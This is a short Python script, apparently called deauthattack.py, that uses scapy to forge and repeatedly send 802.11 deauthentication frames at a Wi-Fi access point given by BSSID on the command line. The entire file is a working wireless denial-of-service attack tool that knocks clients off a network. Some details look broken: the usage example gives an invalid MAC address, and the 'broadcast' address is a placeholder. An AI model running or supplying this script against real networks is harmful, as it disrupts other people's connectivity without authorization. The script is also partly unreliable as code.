from scapy.all import *
import sys 
from colorama import *

init()
if (len(sys.argv) < 2):
    print(" ")
    print(" ")
    print("[!] I need the target BSSID and the COUNTER!")
    print(" ")
    print(" ")
    print("[*] Example: python deauthattack.py aa:1V:3C:dd:ee:ff 1000")
    print(" ")
    quit()
brdmac = "aa:bb:cc:dd:ee:ff"
pkg = "hello"
msg = pkg.encode()
packet = (RadioTap()/Dot11(addr1 = brdmac, addr2 = sys.argv[1], addr3 = sys.argv[1])/Dot11Deauth()
        /(msg))
print(Fore.YELLOW)
sendp(packet,count=int(sys.argv[2]))
